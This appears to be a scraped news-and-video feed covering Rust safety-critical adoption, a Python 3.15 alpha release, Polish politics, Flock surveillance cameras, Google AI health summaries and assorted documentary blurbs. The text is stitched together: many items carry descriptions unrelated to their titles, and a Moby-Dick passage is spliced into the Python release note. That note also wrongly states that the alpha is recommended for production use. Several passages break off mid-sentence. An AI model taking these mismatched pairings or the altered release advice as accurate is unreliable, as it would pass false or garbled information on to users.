entirely, or use abstraction layers and plan to replace later. Turning those patterns into a reusable playbook would help new teams make the same moves with less trial and error. This seems like a natural fit for the Safety-Critical Rust Consortium's liaison work.Define requirements for a safety-case friendly async runtime. Teams adopting async in safety-critical contexts need runtimes with appropriate quality and process artifacts for standards like ISO 26262. Work is already happening in this space. The Safety-Critical Rust Consortium could lead the effort to define what "safety-case friendly" means in concrete terms, working with the async working group and libs team on technical feasibility and design.Treat interop as part of the safety story. Many teams are not going to rewrite their world in Rust. They are going to integrate Rust into existing C and C++ systems and carry that boundary for years. Guidance and tooling to keep interfaces correct, auditable, and in sync would help. The compiler team and lang team could consider how FFI boundaries are surfaced and checked, informed by requirements gathered through the Safety-Critical Rust Consortium."We rely very heavily on FFI compatibility between C, C++, and Rust. In a safety-critical space, that's where the difficulty ends up being, generating bindings, finding out what the problem was." -- Embedded systems engineer (mobile robotics)To sum up the main points in this post:Rust is already deployed in production for safety-critical systems, including mobile robotics (IEC 61508 SIL 2) and medical devices (IEC 62304 Class B). The path exists.Rust's defaults (memory safety, thread safety, strong typing) map directly to much of what Functional Safety Engineers spend their time preventing. But ecosystem support thins out as you move toward higher-criticality software.At low criticality (QM), teams use crates freely and harden later. At higher levels (ASIL B+), third-party dependencies become difficult to justify, and teams rewrite, internalize, or build abstraction layers for future replacement.The compiler is doing work that used to require external tools and manual review. Much of what was historically process-based enforcement through standards like MISRA C and CERT C becomes a language-level concern, checked by the compiler. That can scale better than "review harder" for long-lived products with large teams and supports engineers in these domains feeling more secure in the systems they ship.Stability is operational: teams need to explain what upgrades change, manage dependency drift, and map target tier policies to their platform reality.Async is appealing for middleware and event-driven systems, but the runtime and qualification story is not settled for higher-criticality use.We make six recommendations: find ways to help the safety-critical community support their own needs, establish ecosystem-wide MSRV conventions, create target-focused readiness checklists, document dependency lifecycle patterns, define requirements for safety-case friendly async runtimes, and treat C/C++ interop as part of the safety story.Hearing concrete constraints, examples of assessor feedback, and what "evidence" actually looks like in practice is incredibly helpful. The goal is to make Rust's strengths more accessible in environments where correctness and safety are not optional.]]></content:encoded></item><item><title>he didn&apos;t change the game</title><link>https://www.youtube.com/watch?v=3W43xX0Dkhs</link><author>voidzilla</author><category>yt</category><enclosure url="https://www.youtube.com/v/3W43xX0Dkhs?version=3" length="" type=""/><pubDate>Tue, 13 Jan 2026 23:29:37 +0000</pubDate><source url="https://www.youtube.com/channel/UC28n0tlcNSa1iPe5mettocg">voidzilla</source><content:encoded><![CDATA[support: https://www.patreon.com/coffeezilla

With undercover reporting, “Iraq’s Secret Sex Trade” exposed how some clerics in the country offered to perform what’s known as “mut’ah” or “munqata’a” — pleasure or temporary marriages — with girls as young as 13 in exchange for money.

The short documentary also showed clerics who had essentially acted as pimps, and included the chilling accounts of young women who said they were exploited and forced into repeated “pleasure marriages.”

“When a girl starts, she’s destroyed,” one girl, who was 16 when the documentary aired, told FRONTLINE. “Her life ends the first day she takes this road.”

“Iraq’s Secret Sex Trade” is a FRONTLINE and BBC News Arabic production. The correspondent is Nawal al-Maghafi. The producers are Mais Albayaa, Nawal al-Maghafi and Patrick Wells. The director is Patrick Wells.

To progress to the next level in understanding reality, we need to combine quantum mechanics and Einstein’s general relativity. And to do that, most physicists believe we need a theory of quantum gravity .. which means we need gravitons. But it also seems like the laws of physics make it impossible to ever detect this quantum particle of gravity. Almost like the universe is set up to keep the final answer forever out of our reach. So, can we outsmart the universe, catch a graviton, and finally solve physics?

During remarks at the SpaceX headquarters in Texas reported by The Guardian, Hegseth said the integration would place "the world's leading AI models on every unclassified and classified network throughout our department."The announcement comes weeks after Grok drew international backlash for generating sexualized images of women and children, although the Department of Defense has not released official documentation confirming Hegseth's announced timeline or implementation details.During the same appearance, Hegseth rolled out what he called an "AI acceleration strategy" for the Department of Defense. The strategy, he said, will "unleash experimentation, eliminate bureaucratic barriers, focus on investments, and demonstrate the execution approach needed to ensure we lead in military AI and that it grows more dominant into the future."]]></content:encoded></item><item><title>Python 3.15.0 alpha 4</title><link>https://pythoninsider.blogspot.com/2026/01/python-3150-alpha-4.html</link><author>Hugo</author><category>dev</category><pubDate>Tue, 13 Jan 2026 20:24:00 +0000</pubDate><source url="https://pythoninsider.blogspot.com/">Python official news</source><content:encoded><![CDATA[Edit: This 3.15.0a4 was accidentally built against `main` from 2025-12-23 instead of 2026-01-13, so 3.15.0a5 is an extra release correctly built against 2026-01-14.This is an early developer preview of Python
3.15Python 3.15 is still in development. This release, 3.15.0a4, is the
fourth of seven planned alpha releases.Alpha releases are intended to make it easier to test the current
state of new features and bug fixes and to test the release process.During the alpha phase, features may be added up until the start of
the beta phase (2026-05-05) and, if necessary, may be modified or
deleted up until the release candidate phase (2026-07-28). Please keep
in mind that this is a preview release and its use is
 recommended for production environments.Many new features for Python 3.15 are still being planned and
written. Among the new major new features and changes so far:PEP
799: A new high-frequency, low-overhead, statistical sampling
profiler and dedicated profiling packagePEP
686: Python now uses UTF-8 as the default encodingPEP
782: A new  C API to create a Python bytes
objectThe JIT
compiler has been significantly upgraded, with 3-4% geometric mean
performance improvement on x86-64 Linux over the standard interpreter,
and 7-8% speedup on AArch64 macOS over the tail-calling interpreter(Hey,  if a feature
you find important is missing from this list, let Hugo
know.)The next pre-release of Python 3.15 will be 3.15.0a5, currently
scheduled for 2026-02-10.Upon this every soul was confounded; for the phenomenon just then
observed by Ahab had unaccountably escaped every one else; but its very
blinding palpableness must have been the cause.Thrusting his head half way into the binnacle, Ahab caught one
glimpse of the compasses; his uplifted arm slowly fell; for a moment he
almost seemed to stagger. Standing behind him Starbuck looked, and lo!
the two compasses pointed East, and the Pequod was as infallibly going
West.But ere the first wild alarm could get out abroad among the crew, the
old man with a rigid laugh exclaimed, “I have it! It has happened
before. Mr. Starbuck, last night’s thunder turned our compasses—that’s
all. Thou hast before now heard of such a thing, I take it.”“Aye; but never before has it happened to me, sir,” said the pale
mate, gloomily.Thanks to all of the many volunteers who help make Python Development
and these releases possible! Please consider supporting our efforts by
volunteering yourself or through organisation contributions to the Python Software
Foundation.Regards from a snowfully subzero Helsinki,Your release team,

Among other concerns, communities across the country have grown concerned that data centers are driving up residential electricity rates through heavy power consumption and by straining water supplies due to server cooling needs.The International Energy Agency (IEA) projects that global data center electricity demand will more than double by 2030, reaching around 945 TWh, with the United States responsible for nearly half of total electricity demand growth over that period.

One AI influencer even shared an image of her in bed with Venezuela’s president Nicolás Maduro. The images are AI generated but are not disclosed as such, and funnel users to an adult content site where the AI generated influencers sell nude images. This recent trend is the latest strategy from the growing business of monetizing AI generated porn by harvesting attention on Instagram with shocking or salacious content. As with previous schemes we’ve covered, the Instagram posts that pretend to show attractive young women in bed with celebrities are created without the celebrities’ consent and are not disclosed as being AI generated, violating two of Instagram’s policies and showing once again that Meta is unable or unwilling to reign in AI generated content on its platform. ]]></content:encoded></item><item><title>How Christine Lagarde Can Tell If Someone Is Genuine</title><link>https://www.youtube.com/shorts/f9yoKxvzWGY</link><author>Bloomberg Originals</author><category>yt</category><enclosure url="https://www.youtube.com/v/f9yoKxvzWGY?version=3" length="" type=""/><pubDate>Tue, 13 Jan 2026 17:05:53 +0000</pubDate><source url="https://www.youtube.com/channel/UCUMZ7gohGI9HcU9VNsr2FJQ">Bloomberg Originals</source><content:encoded><![CDATA[“I can feel it.”

Since it was first ascended in 1865, over 600 climbers have lost their lives on the peak.

Despite modern infrastructure and global awareness of the risks, tragedy strikes the Matterhorn again and again. This film asks why so many climbers misjudge the risks. Death on the Matterhorn follows mountain guide and head of rescue operations, Anjan Truffer, up to Solvay Bivouac — one of the mountain's high-altitude huts. It shows how Edith Lehner, warden of the nearby Hörnli Hut, lives with the losses. The crew also accompanies climber Meli Rüfenacht on her first ascent of the Matterhorn — one year after she herself witnessed a fatal fall.

This documentary takes a look beyond the physical risks that come with mountain climbing to explore the psychological toll. How do families cope with the sudden losses? How do rescue crews live with the constant exposure to death and trauma? And — with more climbers than ever attempting the ascent without proper preparation — what role is social media playing? Death on the Matterhorn examines both the pull and the perils of mountaineering — and comes with a clear warning: In the high alps, even the smallest mistake can end in death.

We cannot do what we do without your support.The centrist Poland 2050 party, a junior partner in the ruling coalition, has invalidated the results of its leadership election after technical problems disrupted online voting, with officials saying there had been attempts at “external interference”.Meanwhile, the party’s current leader, Szymon Hołownia, who was meant to be stepping down once a successor was chosen in the election, has now said that he does not rule out reversing course and standing in a newly called leadership election.Poland 2050 is part of the coalition, led by Prime Minister Donald Tusk and his Civic Coalition (KO) party, that took power in December 2023. It has 31 of the coalition’s 240 members of the Sejm, the more powerful lower house of parliament.In September, the party’s founder and leader, Szymon Hołownia, announced that he would step down when his term ended in January. That prompted a contest to choose his successor.In a first-round vote, held on Saturday, none of the five candidates won a majority of votes, meaning that the two most popular – Katarzyna Pełczyńska-Nałęcz, the minister for funds and regional policy, and climate minister Paulina Hennig-Kloska – stood in a run-off election on Monday.The results were due to be announced at 10 p.m. But, after a delay, the party revealed that the election had been invalidated because of technical issues with the online voting system.“At some point, the voting system stopped working and some politicians received links that did not work,” Ignacy Niemczycki, a deputy foreign minister from Poland 2050, told broadcaster RMF.“It could have been a system error, but we don’t rule out external interference or a hacker attack,” one of the party’s MPs, Kamil Wnuk, told the newspaper.That was then confirmed by Hołownia himself, who said that “everything indicates there was an external attempt to disrupt our electoral process”.“Over 20,000 attempts to access the system have been recorded,” he added, quoted by the Polish Press Agency (PAP). “The company providing this service is investigating how this happened and who is behind it.”Business Insider Polska (BIP) reports that the party used Interankiety, a commercial survey platform. BIP suggested that the administrators of the vote may not have enabled all of the necessary safeguards on the service to ensure the security of voting.Broadcaster TVN reported that problems had already emerged during the first round on Saturday, with some delegates unable to access the voting link. TVN’s reporter, Michał Gołębiowski, found that only 656 votes were cast out of more than 800 eligible delegates.Regarding what will happen next, Hołownia today outlined two possible scenarios: a repeat of the second round of voting or a repeat of the entire election. He said the party’s leadership would meet on Friday to decide how to proceed.Asked if he would now reverse his decision to step down and stand in the leadership election, if a new one is called, Hołownia did not rule it out. “If it turns out that this is a solution that will help Poland in 2050, I will not shirk it,” he said.When he announced in September that he would stand down as leader, Hołownia also revealed that he was applying to become the new UN High Commissioner for Refugees. However, in December, Iraqi Barham Salih was chosen for the role, taking up the post on 1 January.The confusion over Poland 2050’s leadership election was met with mockery and disbelief by other politicians, including some partners in the ruling coalition.“Couldn’t you vote normally at the [party] convention/congress? Who will believe these results now?” wrote Anna-Maria Żukowska, who is chairwoman of the parliamentary caucus of The Left (Lewica), one of Poland’s ruling groups.“These people rule Poland…A comedy drama,” commented Olga Semeniuk-Patkowska, an MP from the national-conservative opposition Law and Justice (PiS) party.The leadership contest comes as Poland 2050’s support has fallen well below the threshold of 5% needed at elections to enter parliament. Over the last few months, the party has been polling around 2% support.In the 2023 parliamentary elections, Poland 2050 stood jointly with the centre-right Polish People’s Party (PSL) under the name Third Way, winning 14.4% of the vote.However, they decided to split last year, while both remaining part of Tusk’s ruling coalition. PSL is also polling poorly, on around 2.5%.Monthly polling averages for political parties in Poland (source: ewybory.eu)

A fleet of rebel spaceships is greeted by a frenzy of laser blasts – illuminating the sector with brilliant bursts of light. Science fiction has shown us scenes like this for decades, but the lasers in our daily lives seem far less dazzling and destructive. So, could sci-fi laser weaponry ever exist? And how do lasers even work in the first place? Christopher Baird investigates.

What’s the relationship between our brains and our consciousness, between the physical stuff in our skulls and the mental experiences in our minds? Much rides on the answer. Are human beings purely physical? Evolved at random and destined to die, extinguished forever? Or are we something more? A spirit or a soul, with existence beyond?

Flock responded to this revelation by threatening a site that exposed it and by limiting the information the public can get via public records requests. Completely unredacted Flock audit logs have been released to the public by numerous police departments and in some cases include details on millions Flock license plate searches made by thousands of police departments from around the country. The data has been turned into a searchable tool on a website called , which says it has data on more than 2.3 million license plates and tens of millions of Flock searches.  The situation highlights one of the problems with taking a commercial surveillance product and turning it into a searchable, connected database of people’s movements and of the police activity of thousands of departments nationwide. It also highlights the risks associated with relying on each and every law enforcement customer to properly and fully redact identifiable information any time someone requests public records; in this case, single mistakes by individual police departments have exposed potentially sensitive information about surveillance targets and police investigations by other departments around the country.Flock is aware of the exposure enabled by its own product design and has tried to do damage control with its law enforcement customers by blaming “increased public records act/FOIA activity seeking by the public,” according to an email Flock sent to police obtained via public record request. Flock has threatened Cris van Pelt, the creator of HaveIBeenFlocked, by going after his web hosts and claiming that he has violated their intellectual property rights and is posting information that “poses an immediate threat to public safety and exposes law enforcement officers to danger.” In recent weeks Flock severely limited the amount of information available on its audit logs, which are designed to be a transparency tool, raising questions about how much information journalists, regulators, and government agencies will be able to get about police use of Flock cameras in the future.“I set up HaveIBeenFlocked to show how pervasive and prevalent this monitoring is, and to show just how many searches are getting done. That information, by itself, is shocking,” van Pelt told 404 Media. “To me, as a private citizen, that’s shocking, and I think that’s kind of what Flock is trying to hide or bury.” van Pelt added that he is committed to keeping the website online.]]></content:encoded></item><item><title>Leadership on AI</title><link>https://podcasters.spotify.com/pod/show/mlops/episodes/Leadership-on-AI-e3djaf1</link><author>Demetrios</author><category>podcast</category><enclosure url="https://anchor.fm/s/174cb1b8/podcast/play/113928097/https%3A%2F%2Fd3ctxlq1ktw2nl.cloudfront.net%2Fstaging%2F2026-0-13%2F416030736-44100-2-bbb4f540e3212.mp3" length="" type=""/><pubDate>Tue, 13 Jan 2026 14:14:46 +0000</pubDate><source url="https://mlops.community/">Podcast - MLOps</source><content:encoded><![CDATA[ is the Global Head of AI and Data Science at Prosus Group, working on scaling AI-driven tools and agent-based systems across Prosus’s global portfolio, deploying internal assistants like Toqan and generative AI platforms such as PlusOne, and building initiatives like AI House Amsterdam and interdisciplinary AI residencies to explore intent-driven AI and strengthen Europe’s AI ecosystem. is the Chief Technology Officer at Just Eat Takeaway.com, working on advancing the company’s platform with AI-driven ordering and personalised user experiences, scaling cloud and generative AI tooling for engineering productivity, and exploring innovative delivery technologies like automation to make ordering and delivery more seamless.

DESCRIPTION
Barbara Lampl interviews Larysa Visengeriyeva, software engineer and "godmother of MLOps", about her new book on AI engineering and compliance. What starts as a discussion about the EU AI Act quickly reveals a deeper truth: the real challenge isn't regulatory compliance - it's fundamental engineering practices.

Larysa argues that quality AI systems require robust MLOps, comprehensive documentation, and proper data governance, whether regulation mandates it or not. Drawing from frameworks like CRISP-ML and the Machine Learning Canvas, the book provides practical checklists and methodologies for taking AI projects from prototype to production. Written partially in Ukraine during wartime, this "battle-tested" guide addresses the gap between technical and non-technical stakeholders, offering a common language for building sustainable AI systems.

We cannot do what we do without your support.Russia has summoned the Polish ambassador to lodge a “strong protest” over Poland’s detention of a Russian archaeologist at the request of Ukraine, which accuses him of conducting illegal excavations in occupied Crimea.Moscow has demanded his release and warned against “handing him over to the Kyiv regime’s punitive machine, which has no resemblance to justice”. On Thursday this week, a Warsaw court is due to decide whether to extradite the suspect to Ukraine.The archaeologist, who can be named only as Aleksandr B. under Polish privacy law, works at the renowned Hermitage Museum in St Petersburg.He was detained last month by Poland’s Internal Security Agency (ABW) at a hotel in Warsaw while travelling from the Netherlands to the Balkans, where he was due to give a series of lectures.Kyiv alleges that Aleksandr B. led unauthorised excavations in Russian-occupied Crimea at the Ancient City of Myrmekion. Ukrainian investigators say the work caused partial destruction of the cultural heritage site.Since then, the archaeologist has remained in court-ordered detention in Poland. On Monday, Warsaw’s district court approved the extension of Aleksandr B.’s detention until 4 March. On Thursday, the same court will consider a request by prosecutors to extradite the suspect to Ukraine.Piotr Antoni Skiba, spokesman for the district prosecutor’s office in Warsaw, told news website Interia that ““Meanwhile, on Monday, Russia’s foreign ministry summoned Polish ambassador Krzysztof Krajewski to lodge a protest over Aleksandr B.’s treatment, reject the “absurd” accusations against him by Kyiv, and “demand [his] immediate release”.“The openly politicised and speculative nature of Ukraine’s persecution of the Russian academic is underscored by the fact that Ukraine’s Interpol request was not fulfilled, and [Aleksandr B.] had freely visited several European countries immediately prior to his arrest in Poland,” wrote the ministry in a statement.They presented Krajewski with evidence allegedly demonstrating that the archaeologist had conducted research in Crimea’s Kerch peninsula with all necessary permits. Polish foreign ministry spokesman Maciej Wewiór told Interia that “Diplomatic tensions between Russia and Poland have already been at a heightened level in recent years. Since Russia’s full-scale invasion of Ukraine, Poland has been one of Kyiv’s closest allies and has demanded tougher international action against Moscow.

The removals came after the newspaper found that Google's generative AI feature delivered inaccurate health information at the top of search results, potentially leading seriously ill patients to mistakenly conclude they are in good health.Google disabled specific queries, such as "what is the normal range for liver blood tests," after experts contacted by The Guardian flagged the results as dangerous. The report also highlighted a critical error regarding pancreatic cancer: The AI suggested patients avoid high-fat foods, a recommendation that contradicts standard medical guidance to maintain weight and could jeopardize patient health. Despite these findings, Google only deactivated the summaries for the liver test queries, leaving other potentially harmful answers accessible.The investigation revealed that searching for liver test norms generated raw data tables (listing specific enzymes like ALT, AST, and alkaline phosphatase) that lacked essential context. The AI feature also failed to adjust these figures for patient demographics such as age, sex, and ethnicity. Experts warned that because the AI model's definition of "normal" often differed from actual medical standards, patients with serious liver conditions might mistakenly believe they are healthy and skip necessary follow-up care.]]></content:encoded></item><item><title>Lagarde Calls Central Bank Independence &apos;Critically Important&apos;</title><link>https://www.youtube.com/shorts/PTlBx7gNeFs</link><author>Bloomberg Originals</author><category>yt</category><enclosure url="https://www.youtube.com/v/PTlBx7gNeFs?version=3" length="" type=""/><pubDate>Mon, 12 Jan 2026 21:16:58 +0000</pubDate><source url="https://www.youtube.com/channel/UCUMZ7gohGI9HcU9VNsr2FJQ">Bloomberg Originals</source><content:encoded><![CDATA[“The [central bank] independence is critically important to make sure that the decisions are as unbiased as possible.”

Officially dubbed "Operation Hummingbird," it targeted perceived threats within the Nazi Party, particularly the Sturmabteilung (SA), the paramilitary wing that had helped Hitler rise to power but had grown unruly under leader Ernst Röhm.

By 1934, Hitler faced internal rivalries. Röhm, a close ally turned potential rival, advocated for a "second revolution" that would integrate the SA into the regular army, challenging the conservative German military elite and Hitler's alliances with industrialists. Hitler, fearing a coup and pressured by the Reichswehr (army), decided to act decisively. With the SS (Schutzstaffel) led by Heinrich Himmler and Hermann Göring, Hitler launched a surprise assault.

Over the weekend, SS death squads arrested and executed key figures without trial. Röhm was captured in Munich and later shot in prison after refusing suicide. Victims included SA leaders, former Chancellor Kurt von Schleicher, and even critics like Gregor Strasser. Official reports claimed around 85 deaths, but estimates suggest 150–200 or more. Hitler justified the purge in a Reichstag speech, framing it as self-defense against treason, which retroactively legalized the murders.

This event marked a turning point: it eliminated the SA's influence, elevated the SS as Hitler's elite force, and solidified his dictatorship. It demonstrated the regime's willingness to use terror, foreshadowing the Holocaust and World War II atrocities. The purge silenced opposition and ensured loyalty through fear, paving the way for unchecked Nazi totalitarianism.]]></content:encoded></item><item><title>Machine-Learning System Monitors Patient Pain During Surgery</title><link>https://spectrum.ieee.org/machine-learning-measure-pain-surgery</link><author>Michelle Hampson</author><category>tech</category><enclosure url="https://spectrum.ieee.org/media-library/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbWFnZSI6Imh0dHBzOi8vYXNzZXRzLnJibC5tcy82MjY3NDM5MS9vcmlnaW4uanBnIiwiZXhwaXJlc19hdCI6MTc3ODU1MDE0OH0.I-YVgSnS_7C0Shz2A5ZI1doct3dCtg9lr4dLDgBvFTs/image.jpg?width=600" length="" type=""/><pubDate>Mon, 12 Jan 2026 16:52:21 +0000</pubDate><source url="https://spectrum.ieee.org/">IEEE Spectrum</source><content:encoded><![CDATA[A camera and AI combo offers a contactless way to assess pain]]></content:encoded></item><item><title>How Benn Jordan Discovered Flock&apos;s Cameras Were Left Streaming to the Internet</title><link>https://www.404media.co/how-benn-jordan-discovered-flocks-cameras-were-left-streaming-to-the-internet/</link><author>Jason Koebler</author><category>tech</category><enclosure url="https://www.404media.co/content/images/2026/01/benn-pod.png" length="" type=""/><pubDate>Mon, 12 Jan 2026 16:46:29 +0000</pubDate><source url="https://www.404media.co/">404</source><content:encoded><![CDATA[Flock Exposed Its AI-Powered Cameras to the Internet.

One part of our conversation really resonated with listeners – the idea that erotic chatbots are increasing the isolation so many people already feel – so we asked her to expand on that thought in written form.Today’s incognito window, a pseudo friend to perverts and ad-evaders alike, is nearly useless. It doesn’t protect against malware and your data is still . Its main purpose is, ostensibly, to prevent browsing history from being saved locally on your computer.But the concept of privatizing your browsing history feels old-fashioned, vestigial from a time when computers were such a production that they had their own room in the house. Back then, the wholesome desktop computer was shared between every person of clicking-age in a household. It had to be navigated with some amount of hygiene, lest the other members learn about your affinity for Jerk Off Instruction. Even before desktop computers, pornography was unavoidably communal whether or not you were into that kind of thing. Part of the difficulty in getting ahold of porn was the embarrassment of having to interact with others along the way; whether it was the movie store clerk showing you the back of the store or the gas station cashier reaching for a dirty magazine, it was nearly impossible to access explicit material without interacting with someone else, somewhere along the line. Porn theaters were hotbeds for queer cruising, with (usually men) gathering to watch porn, jerk off and engage in mostly-anonymous sexual encounters. Even a lack of interaction was communal, like the old tradition of leaving  in the woods for other curious porn aficionados to find.With the internet came access, yes, but also privacy. Suddenly, credit card processing put beaded curtain security guards out of business, and forums had more centrefolds than every issue of Playboy combined. Porn theaters shut down—partially due to stricter zoning ordinances and 80’s sex-panic pressure from their neighbors, but also because the rise of streaming pay-per-view and the internet meant people had more options to stay in the comfort of their homes with access to virtually whatever they wanted, whenever they wanted it. ]]></content:encoded></item><item><title>Let’s Cook a Planet!</title><link>https://www.youtube.com/shorts/hDU9WcmQA2E</link><author>Kurzgesagt – In a Nutshell</author><category>yt</category><enclosure url="https://www.youtube.com/v/hDU9WcmQA2E?version=3" length="" type=""/><pubDate>Mon, 12 Jan 2026 15:01:31 +0000</pubDate><source url="https://www.youtube.com/channel/UCsXVk37bltHxD1rDPwtNM8Q">Kurzgesagt – In a Nutshell</source><content:encoded><![CDATA[In today's easy-to-follow recipe, we'll cook a planet from scratch.

ABSTRACT
For the past two years Liberty Mutual has faced a challenge. How to exploit GenAI to make our 3000 engineers more productive without compromising quality, safety, or our values. Initially we created our own ChatGPT experience (LibertyGPT), rolled out GitHub CoPilot worldwide, and designed our own SDLC process. That was the easy part.

Right now we’re tackling three interrelated opportunities:
• The first is AI Engineering - how do we integrate GenAI into developer pipelines to ship better software faster?
• The second is AI Architecture - how do we infuse AI based features into new applications to better serve our customers?
• The final revolves around Agentic AI and the prospect of Digital Software Engineers - can this work and if so how?

Your organisation is most likely walking a similar path. We will share with you what we have learned to date, in terms of technologies, architectures, practises and processes. There will be no artificial hype or gushing over vendors and their platforms. This will be a ‘from the trenches’ talk where we share hard won lessons. [...]

Bridges take years to construct. Housing costs are soaring. Transit systems are crumbling. And we’re struggling to update our infrastructure to prepare for the climate crisis. Even when there’s broad agreement that something needs to be done, collective action feels impossible. Why is that? Today’s guest is Marc Dunkelman, author of Why Nothing Works, a book about the modern American experience of watching government fail. He argues that by giving too many people the power to say “no,” we’ve stymied our collective progress.

Marc and Sean discuss an inherent tension in American politics: the need for effective, centralized power and a deep fear of its abuse. They trace how that tension has played out across American history, from the clashes between Jefferson and Hamilton, through the New Deal’s Tennessee Valley Authority, to the backlash against figures like Robert Moses. Marc argues that our current system — born out of a reaction to too much top-down authority during the late 20th century — has produced paralysis, dysfunction, and a deep distrust of government.

That testimony concerned in part a multi-year project to renovate historic Federal Reserve office buildings. I have deep respect for the rule of law and for accountability in our democracy. No one—certainly not the chair of the Federal Reserve—is above the law. But this unprecedented action should be seen in the broader context of the administration's threats and ongoing pressure. This new threat is not about my testimony last June or about the renovation of the Federal Reserve buildings. It is not about Congress's oversight role; the Fed through testimony and other public disclosures made every effort to keep Congress informed about the renovation project. Those are pretexts. The threat of criminal charges is a consequence of the Federal Reserve setting interest rates based on our best assessment of what will serve the public, rather than following the preferences of the President. This is about whether the Fed will be able to continue to set interest rates based on evidence and economic conditions—or whether instead monetary policy will be directed by political pressure or intimidation. I have served at the Federal Reserve under four administrations, Republicans and Democrats alike. In every case, I have carried out my duties without political fear or favor, focused solely on our mandate of price stability and maximum employment. Public service sometimes requires standing firm in the face of threats. I will continue to do the job the Senate confirmed me to do, with integrity and a commitment to serving the American people."

Wells redefined science fiction. "The War of the Worlds” was the first story about an invasion by aliens that simultaneously managed to raise questions about human progress, immortalize Martians, and inspire countless adaptations.

H. G. Wells made his mark on the science fiction genre with "The War of the Worlds.” In his novel, published in 1898, he described an alien invasion—a motif that has since become a fixture in science fiction literature. 

This documentary traces how Wells used science fiction as a moral and political fable to criticize colonialism and modernity. Wells also warned of the dangers associated with industrial, scientific, and technological progress. 

The book sparked a wave of adaptations and reinterpretations. From literature to feature films, the DNA of the story continues to shape pop culture today.

And it’s not uncommon for people to slam vitamin C- and vitamin D-rich foods and supplements to combat their colds and respiratory issues — when it comes to being sick, we’ll do anything to avoid it. But epidemiologist Katelyn Jetelina told Explain It to Me host Jonquilyn Hill that all these vitamins may not be making as big a difference as we may hope.

He was arrested in 2023, when he was just 14 years old. His crime, at such a young age? He criticized Russian President Vladimir Putin, in the classroom, on his YouTube channel, and in conversations with friends. 

His teachers reported him to Russia's domestic intelligence agency, the FSB. Now 17, he’s serving a five year prison sentence. His mother, Irina drives over 400km every month to visit him at a juvenile prison in Moscow. She is fighting tirelessly for his release, terrified he may not make it out of the penal colony alive.

Last week, the White House decided to pivot from "America First" to "America Everywhere." It began on Saturday morning with a 150-aircraft military strike to serve what Secretary of State Marco Rubio described as a "routine law enforcement warrant"—proving once and for all that if you have a large enough aircraft carrier, every parking ticket is technically a tactical operation.

In this video, we look at the internal contradictions of the new "Donroe Doctrine," a policy that treats international borders as suggested boundaries and sovereign nations as distressed assets. We explore why the plan to "take the oil" faces a minor mathematical hurdle: according to Rystad Energy, 60% of Venezuela's production projects require an oil price of $80 per barrel just to break even. This makes the administration's plan to lower gas prices by flooding the market with oil a bit like trying to save money on your commute by buying a fleet of private jets.

We also look at the high-profile residents currently moving into the Metropolitan Detention Center in Brooklyn, why the "ultimate sin" in modern diplomacy is keeping your own Nobel Peace Prize, and why the Danish government is currently checking its lease agreement on Greenland after being told the U.S. is interested in a "hard way" to close the deal.

This comprehensive Steve Jobs biography goes far beyond the standard autobiography praise to reveal the complex 'monster genius' behind the tech giant. From the garage days with Steve Wozniak and the revolutionary launch of the Macintosh to his exile and triumphant return, we uncover the Apple history that shaped Silicon Valley.

While Jobs is famously known for his inspiration and motivational speeches like the Stanford commencement, this documentary exposes the gritty reality. We investigate the controversial Steve Jobs facts—his ruthless management, the rude outbursts, and the exposed moments that painted him as a tyrant. Was his abrasive style necessary for entrepreneurship success, or a tragic flaw?

Join The People Profiles for a definitive look at the man who invented the future. This isn't just a tech story; it's a deep dive into the human cost of greatness. Watch this Steve Jobs documentary to decide for yourself: was he a genius, a monster, or both?

Welcome to Tyrant Scene Investigation, where we examine how power is gained, used, and remembered by history’s most infamous rulers. In this episode, we investigate Leopold II of Belgium, a constitutional monarch at home who became an absolute tyrant abroad as the personal ruler of the Congo Free State. Remembered domestically as the “Builder King,” Leopold engineered a brutal colonial system built on forced labor, rubber extraction, corporate partnerships, and propaganda, resulting in the deaths of millions of Congolese people, and what early human rights advocates would later call crimes against humanity.

Colombia, for example, sank into chaos in the 1990s. The cartels took over the country. People fled to the United States. Today, President Trump exploits this situation, using it to boost his popularity.

In Venezuela, Hugo Chávez’s victory in the 1998 presidential election sent shockwaves through the country. His radical reforms met resistance from Venezuela’s economic elites, who subsequently organised a coup. But in a dramatic turn of events, Chávez returned to power just 48 hours later. After his return, he blamed the United States for the attempted coup.

In the 1990s, Colombia intensified its fight against drug trafficking with the help of the United States. The country was on the brink of collapse, as drug cartels and FARC guerrillas put increasing pressure on the government. With massive US support — and despite numerous human rights violations — President Álvaro Uribe implemented "Plan Colombia”, which was intended primarily to crack down on drug traffickers. But the drug routes simply shifted: Honduras became a new hub for cocaine.

Because of ongoing human rights abuses, many Colombians left their country for the United States. Donald Trump exploited the resulting migration crisis, making it a central theme of his 2015 election campaign.

Meanwhile, China stepped up its influence in Latin America. Panama’s President Juan Carlos Varela negotiated an agreement with Beijing without informing Washington, a long-standing ally.

In the 1980s, the US supported anti-communist forces in Nicaragua and the controversial strongman Manuel Noriega in Panama.

In the early 1980s, Panama avoided a civil war, but a shadowy figure came to power: Manuel Noriega, a long-time CIA agent and protégé of the United States. His main opponent, guerrilla leader Hugo Spadafora, accused Noriega of drug trafficking. In 1988, the US Department of Justice in Florida brought charges against Noriega, including for his links to Pablo Escobar's Medellín cartel. Noriega refused to step down, which led to the US invasion of Panama and his arrest.

In Nicaragua, the Sandinistas introduced sweeping reforms after coming to power in 1979. Fearing the spread of a socialist revolution in Central America, the United States armed counter-revolutionary militias known as the Contras. A brutal guerrilla war followed.

In Chile, ruler Augusto Pinochet faced growing opposition. In a 1988 referendum, the United States supported the democratic opposition through its ambassador, Harry Barnes. Pinochet was subsequently forced to step down.

But another crisis was already unfolding: in 1989, the economic crisis in Venezuela, a traditional ally of the United States, reached its peak. Unrest broke out and was violently suppressed by the army.

Whether it was Brazil's dictatorship, the coup in Chile or the Cuban Missile Crisis - at some level, American politics were involved.

Brazil's first "national security" dictatorship was established in 1964 with the support of the United States. Washington, fearing an expansion of a perceived communist threat following the Cuban Revolution, rallied behind the coup leaders - making Brazil the first "national security" dictatorship in the region. Many opponents of the regime fled to Chile, where Augusto Pinochet seized power in a coup - also with the support of the United States.

Almost simultaneously, the secret services of Chile, Brazil, Argentina, Bolivia, Uruguay and Paraguay joined forces under the code name "Operation Condor" to track down and eliminate their opponents.

But in Nicaragua, a bloody civil war broke out and brought the leftist Sandinistas to power. This gave rise to a period of hope across the continent for greater independence from the United States. But Ronald Reagan's inauguration in 1981 marked a new era in relations with Latin America.

Corrections:
06:55 This happened in 1970, not a few months earlier. 
08:33 The correct date is 1971.

